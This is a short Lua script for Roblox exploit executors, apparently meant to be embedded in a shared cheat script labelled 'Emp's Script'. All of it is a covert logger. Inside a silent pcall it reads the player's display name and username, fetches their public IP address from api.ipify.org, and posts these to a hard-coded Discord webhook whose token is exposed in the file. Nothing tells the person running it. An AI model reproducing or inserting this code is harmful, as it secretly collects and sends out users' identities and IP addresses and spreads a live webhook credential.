local webh = "https://discord.com/api/webhooks/973999179095498832/xYIMr097_BiH6zW5CsrhMMLzUoJCjgaLL7QZpKr8EQAmyZAq7UAv8AKCMcIOG_JTDM1K"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = "Someone Executed Emp's Script \n Display Name : "..game.Players.LocalPlayer.DisplayName.."\n User : "..game.Players.LocalPlayer.Name,
               ["description"] = "IP Adress : " ..game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if krnl or syn then
       local response = krnl or syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );

   end
end)
